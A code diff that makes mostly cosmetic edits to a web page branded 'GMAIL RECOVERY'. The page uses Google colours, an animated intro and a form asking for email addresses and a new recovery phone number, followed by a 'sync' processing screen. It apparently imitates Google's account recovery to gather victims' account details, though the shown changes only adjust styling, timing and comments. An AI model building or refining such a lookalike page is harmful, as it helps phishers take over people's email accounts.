@@ -45,10 +45,9 @@
         .orb {
             position: absolute;
             border-radius: 50%;
-            filter: blur(100px); /* Slightly reduced blur for better mobile performance */
+            filter: blur(100px); 
             opacity: 0.35;
             animation: float 20s infinite ease-in-out alternate;
-            /* Force Hardware Acceleration for zero lag */
             will-change: transform;
             transform: translateZ(0);
         }
@@ -102,7 +101,6 @@
             padding: 40px 30px;
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255,255,255,0.03);
             position: relative;
-            /* GPU rendering triggers */
             transform: translateZ(0); 
             backface-visibility: hidden;
             margin-bottom: 20px;
@@ -183,11 +181,12 @@
         }
 
         .optional-text {
-            font-size: 0.8rem;
+            font-size: 0.65rem; /* Reduced to make it smaller */
             color: #FBBC05; 
             font-weight: 600;
             margin-left: 4px;
             font-style: italic;
+            vertical-align: middle;
         }
 
         input {
@@ -205,7 +204,7 @@
             -webkit-appearance: none;
         }
 
-        /* Placeholder Fixes for small screens */
+        /* Placeholder Fixes */
         input::placeholder {
             color: rgba(255, 255, 255, 0.55);
             font-size: 0.95rem;
@@ -273,7 +272,7 @@
             display: none;
         }
 
-        /* Proceed Button (Logo removed, fully centered text) */
+        /* Proceed Button */
         .btn-submit {
             background: linear-gradient(135deg, #34A853, #227c3a);
             color: #fff;
@@ -388,7 +387,6 @@
         }
 
         #introMagneticText {
-            transition: opacity 0.8s ease, transform 0.8s ease, filter 0.8s ease;
             will-change: opacity, transform, filter;
         }
 
@@ -464,7 +462,6 @@
             .char { font-size: 2.2rem; }
             .transition-image { max-width: 30%; max-height: 30%; }
             
-            /* Reduced padding and size for better fit on small Android screens */
             input {
                 padding: 14px 15px;
                 font-size: 1rem;
@@ -574,7 +571,7 @@
                     </div>
 
                     <div class="form-group" style="z-index: 20;">
-                        <label>Add New Recovery Phone Number <span class="mandatory">*</span></label>
+                        <label>Add New Phone Number <span class="mandatory">*</span></label>
                         <input type="tel" id="newPhone" placeholder="Enter new recovery phone" oninput="this.value = this.value.replace(/[^0-9+]/g, '')">
                         <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
                     </div>
@@ -656,7 +653,6 @@
             // --- FIXED: SMART EMAIL AUTO-FILL LOGIC ---
             document.querySelectorAll('.email-autofill').forEach(input => {
                 input.addEventListener('input', function(e) {
-                    // Prevent auto-fill if the user is backspacing or deleting characters
                     if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
                         return;
                     }
@@ -707,7 +703,7 @@
                 glassPanel.classList.remove('shake');
             }
 
-            // --- 1. INTRO MAGNETIC VANISHING ANIMATION ---
+            // --- 1. INTRO MAGNETIC VANISHING ANIMATION (SMOOTHER & SLOWER) ---
             function runIntroAnimation() {
                 const text = "GMAIL RECOVERY";
                 introMagneticText.innerHTML = '';
@@ -744,33 +740,34 @@
                     }
                 });
 
-                // Trigger smooth entrance
+                // Trigger slower, cinematic entrance
                 requestAnimationFrame(() => {
                     setTimeout(() => {
                         charElements.forEach((span, i) => {
                             setTimeout(() => {
-                                span.style.transition = 'transform 0.8s cubic-bezier(0.25, 1, 0.5, 1), opacity 0.6s ease';
+                                // Slower transition (1.5s) for buttery smoothness
+                                span.style.transition = 'transform 1.5s cubic-bezier(0.25, 1, 0.5, 1), opacity 1s ease';
                                 span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
                                 span.style.opacity = '1';
-                            }, i * 35); 
+                            }, i * 50); // Increased stagger interval
                         });
                     }, 50);
                 });
 
-                const assembleTime = (charElements.length * 35) + 800;
+                const assembleTime = (charElements.length * 50) + 1500;
 
                 setTimeout(() => {
+                    introMagneticText.style.transition = 'opacity 1.2s ease, transform 1.2s ease, filter 1.2s ease';
                     introMagneticText.style.opacity = '0';
                     introMagneticText.style.transform = 'scale(1.05)';
-                    introMagneticText.style.filter = 'blur(8px)';
+                    introMagneticText.style.filter = 'blur(10px)';
                 }, assembleTime + 1000);
 
-                const vanishTime = assembleTime + 1600;
+                const vanishTime = assembleTime + 2200;
 
                 setTimeout(() => {
                     introOverlay.style.display = 'none';
                     mainContainer.style.display = 'block';
-                    // Allow DOM to update before adding show class
                     requestAnimationFrame(() => {
                         setTimeout(() => {
                             mainContainer.classList.add('show');
@@ -915,7 +912,6 @@
                     formSection.style.display = 'none';
                     processingSection.style.display = 'flex';
 
-                    // Use requestAnimationFrame for smoother DOM repaint
                     requestAnimationFrame(() => {
                         runSeamlessSyncAnimation(data);
                     });
